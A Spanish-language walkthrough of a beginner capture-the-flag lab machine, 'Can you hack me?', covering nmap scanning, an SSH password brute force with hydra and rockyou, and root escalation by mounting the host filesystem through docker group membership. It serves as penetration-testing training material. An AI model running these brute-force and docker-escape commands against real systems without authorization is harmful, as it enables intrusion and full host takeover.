---
description: '🔍 Dificultad: Principiante'
---

# Can you hack me?

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 192.168.1.53
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (657).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 192.168.1.53
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (658).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 22** perteneciente al **servicio SSH** y el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p21,22,80,3306 -v 192.168.1.53
```

para obtener más información sobre ese puerto específicamente.

<figure><img src="../../.gitbook/assets/image (659).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora exploramos el servicio **HTTP**. Antes que nada se añadió en el fichero `/etc/hosts` el dominio **canyouhackme.thl** con su correspondiente IP.

<figure><img src="../../.gitbook/assets/image (660).png" alt=""><figcaption></figcaption></figure>

Revisamos el código fuente y encontramos un mensaje relevante.

<figure><img src="../../.gitbook/assets/image (661).png" alt=""><figcaption></figcaption></figure>

Descubrimos un posible nombre de usuario llamado **juan** por lo que realizaremos un ataque de fuerza para poder obtener una contraseña y así poder conectarnos como descubrimos al servicio **SSH**.

### 🚀 **EXPLOTACIÓN**

Con la información obtenida anteriormente, realizamos el comando:

```bash
hydra -l juan -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.53
```

que utiliza la herramienta **Hydra** para realizar un ataque de fuerza bruta contra el servicio **SSH** de una máquina con la IP **192.168.1.53**.

<figure><img src="../../.gitbook/assets/image (662).png" alt=""><figcaption></figcaption></figure>

Al realizar el ataque de fuerza bruta, hemos descubierto la contraseña de **juan**. Sabiendo esto, nos conectamos a través de **SSH** al usuario con el comando:

```bash
ssh juan@192.168.1.53
```

<figure><img src="../../.gitbook/assets/image (663).png" alt=""><figcaption></figcaption></figure>

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar pero observamos que no podemos ejecutar sudo.

Listamos permisos **SUID** y **capabilities**, pero no tenemos nada que nos pueda ayudar.

```bash
find / -perm -4000 -user root 2>/dev/null -o -type f -exec getcap {} \; 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (666).png" alt=""><figcaption></figcaption></figure>

Verificamos los grupos a los que pertenece el usuario y observamos que forma parte del grupo **Docker**.

<figure><img src="../../.gitbook/assets/image (665).png" alt=""><figcaption></figcaption></figure>

Vamos a verificar si podemos aprovechar nuestra pertenencia al grupo **Docker**. Para más información, podemos consultar **HackTricks**, donde revisamos los detalles sobre Docker.

```bash
find / -name docker.sock 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (664).png" alt=""><figcaption></figcaption></figure>

Listamos las imágenes y confirmamos que tenemos una llamada **Alpine**.

```bash
docker images
```

<figure><img src="../../.gitbook/assets/image (667).png" alt=""><figcaption></figcaption></figure>

Con esto, ahora podemos ejecutar la imagen montando en el host y utilizando **chroot** para obtener acceso como **root**.

```bash
docker run -it -v /:/host/ alpine chroot /host/ bash
```

<figure><img src="../../.gitbook/assets/image (669).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (670).png" alt=""><figcaption></figcaption></figure>

Hemos finalizado con éxito **todas las etapas del proceso** y cumplido con todos los **requisitos**.&#x20;

¡Buena suerte en tu búsqueda de las **flags**! Recuerda prestar atención a cada detalle, examinar los archivos y servicios detenidamente, y utilizar todas las herramientas a tu alcance para encontrarlas. ¡La clave está en la perseverancia y en no dejar nada sin explorar! ¡Adelante, hacker! 💻🔍🚀
